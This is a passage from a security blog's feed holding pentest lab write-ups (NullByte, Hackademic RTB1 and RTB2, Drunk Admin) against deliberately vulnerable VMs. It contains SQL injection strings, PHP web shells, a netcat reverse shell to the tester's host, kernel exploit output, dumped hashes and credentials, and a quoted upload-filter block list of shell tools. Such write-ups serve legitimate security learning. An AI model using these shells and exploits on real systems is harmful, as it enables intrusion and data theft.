 1605 pts/0    00:00:00 ps
</code></p>

<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>

<blockquote><p>By default, ps selects all processes with the same effective user ID
(euid=EUID) as the current user and associated with the same terminal
as the invoker.</p></blockquote>

<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>

<p><code>plain
cp /bin/sh /tmp/ps
</code></p>

<p>Let&rsquo;s look at the PATH environment variable:</p>

<p><code>plain
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>

<p><code>plain
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Fingers crossed, running procwatch again:</p>

<p>``` plain
ramses@NullByte:/var/www/backup$ ./procwatch</p>

<h1>whoami</h1>

<p>root
```</p>

<p>And we&rsquo;re root..the right way! :D</p>

<p>``` plain
/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
    <updated>2016-07-20T13:36:20-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>

<!-- more -->


<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<p><code>plain
nmap -sU -F -n -T4 192.168.80.166
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 255
</code></p>

<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<p>``` plain
nmap  -p- 192.168.80.166</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
Nmap scan report for 192.168.80.166
Host is up, received arp-response (0.00024s latency).
Not shown: 65533 closed ports, 1 filtered port
Reason: 65533 resets and 1 port-unreach
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```</p>

<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<p><code>plain
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
666/tcp open  doom    syn-ack ttl 64
</code></p>

<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<p><code>plain
666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
</code></p>

<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p><code>plain

</code></p>

<p>Decoding it yielded a hex string this time:</p>

<p><code>plain
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
</code></p>

<p>After decoding the hex string, I got this message:</p>

<p><code>plain
&lt;---------&gt;
Knock Knock Knockin' on heaven's door .. :)
00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
&lt;---------&gt;
</code></p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>for i in 1001 1101 1011 1001
do
nc 192.168.80.167 80 $i
done
```</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<p><code>plain
Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
Versions effected: Joomla! 1.5.12
Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
Vulnerable? Yes
</code></p>

<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<p><code>plain
User-agent: *
Disallow: /administrator/
Disallow: /cache/
Disallow: /components/
Disallow: /images/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /libraries/
Disallow: /media/
Disallow: /modules/
Disallow: /plugins/
Disallow: /templates/
Disallow: /tmp/
Disallow: /xmlrpc/
</code></p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<p>``` plain
<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>

<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
&rsquo;
```</p>

<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p><code>plain
username    usertype    password
Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
</code></p>

<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<p><code>plain
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
</code></p>

<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<p><code>sql
SELECT
"&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/cmd.php";
</code></p>

<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p><code>plain
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
</code></p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<p><code>plain
[snipped]
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
ls /root/
Desktop
Key.txt
</code></p>

<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<p><code>plain
root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
root@pwnbox:~/Downloads#file decoded
decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
</code></p>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<p>``` plain
/ You are only young once, but you can \
\ stay immature indefinitely.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
    <updated>2016-07-18T09:00:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<!-- more -->


<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sql error&rsquo;" ></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
</code></p>

<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
</code></p>

<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<p><code>plain
user_pass               user_login
21232f297a57a5a743894a0e4a801fc3    NickJames
b986448f0bb9e5e124ca91d3d650f52c    JohnSmith
7cbb3252ba6b7e9c422fac5334d22054    GeorgeMiller
a6e514f9486b83cb53d8d932f9a04292    TonyBlack
8601f6e1028a8e8a966f6c33fcd9aec4    JasonKonnors
50484c19f1afdaf3841a0d821ed393d2    MaxBucky
</code></p>

<p>Cracking the hashes revealed the passwords of all the users:</p>

<p><code>plain
admin
PUPPIES
q1w2e3
napoleon
maxwell
kernel
</code></p>

<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-panel.png" title="&lsquo;dashboard&rsquo; &lsquo;admin panel&rsquo;" ></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-404.png" title="&lsquo;404.php&rsquo; &lsquo;php file edited&rsquo;" ></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<p><code>plain
nc -vnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
</code></p>

<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<p>``` plain
sh-4.0$ ./rds
./rds
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Overwriting function pointer&hellip;
[</em>] Linux kernel >= 2.6.30 RDS socket exploit
[<em>] by Dan Rosenberg
[</em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[<em>] Overwriting security ops&hellip;
[</em>] Overwriting function pointer&hellip;
[<em>] Triggering payload&hellip;
[</em>] Restoring function pointer&hellip;
id
uid=0(root) gid=0(root)
cat /root/key.txt
Yeah!!
You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>

<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>

<p>Regards,
mr.pr0n || p0wnbox.Team || 2011
<a href="http://p0wnbox.com">http://p0wnbox.com</a>
```</p>

<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ Don&rsquo;t relax! It&rsquo;s only your tension \
\ that&rsquo;s holding you together.        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
    <updated>2016-06-12T11:51:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<!-- more -->


<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<p><code>plain
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
</code></p>

<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<p><code>php
&lt;?php
echo exec($_GET['cmd']);
?&gt;
</code></p>

<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<p><code>php
echo exec('whoami');
</code></p>

<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<p><code>php
echo exec($_REQUEST['cmd']);
</code></p>

<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<p><code>plain
root@pwnbox:~#nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
ls /home
bob
ls /home/bob/
Documents
public_html
</code></p>

<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<p><code>plain
ls -a /var/www
.
..
.htaccess
.proof
image.php
images
index.php
info.php
myphp.php
style
upload.php
xmm.html
</code></p>

<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<p>``` plain
cat .proof</p>

<h6>#</h6>

<h1>Drunk Admin Challenge</h1>

<h1>by @anestisb</h1>

<h6>#</h6>

<p>bob> Great work.
bob> Meet me there.
&hellip;> ?
bob> What? You don&rsquo;t know where?
bob> Work a little more your post</p>

<pre><code> exploitation skills.
</code></pre>

<p>Secret Code:
TGglMUxecjJDSDclN1Ej</p>

<p>Mail me your methods at:
<a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#97;&#110;&#x65;&#x73;&#116;&#105;&#115;&#x40;&#98;&#x65;&#99;&#x68;&#116;&#x73;&#111;&#117;&#100;&#x69;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#110;&#x65;&#x73;&#116;&#105;&#x73;&#64;&#98;&#x65;&#x63;&#x68;&#x74;&#x73;&#x6f;&#x75;&#100;&#105;&#x73;&#x2e;&#x63;&#111;&#x6d;</a>
```</p>

<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<p><code>plain
ls /home/bob/public_html
encrypt.php
include
index.php
</code></p>

<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<p>``` python</p>

<p>import base64
import binascii</p>

<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>

<p>try:</p>

<pre><code>base64.decodestring(testme)
print base64.decodestring(testme)
</code></pre>

<p>except binascii.Error:</p>

<pre><code>print "[x] Sorry, this isn't base64"
</code></pre>

<p>```</p>

<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<p>``` php
if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>

<pre><code>$file = file_get_contents("./images/$image_name");
if( strpos($file,"perl") ||
strpos($file,"bash") ||
strpos($file,"sh -c") ||
strpos($file,"python") ||
strpos($file,"nc ") ||
strpos($file,"netcat") ||
strpos($file,"base64") ||
strpos($file,"ruby") ||
strpos($file,"fsockopen") ||
strpos($file,"xterm") ||
strpos($file,"gcc") ||
strpos($file,'$_GET') ||
strpos($file,'$_POST') ||
strpos($file,'$_SERVER') ||
strpos($file,'$_FILES') ||
strpos($file,'$_COOKIE') )
{ 
echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
exec("rm ./images/$image_name");
die;
}
</code></pre>

<p>```</p>

<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
]]></content>
  </entry>
  
</feed>
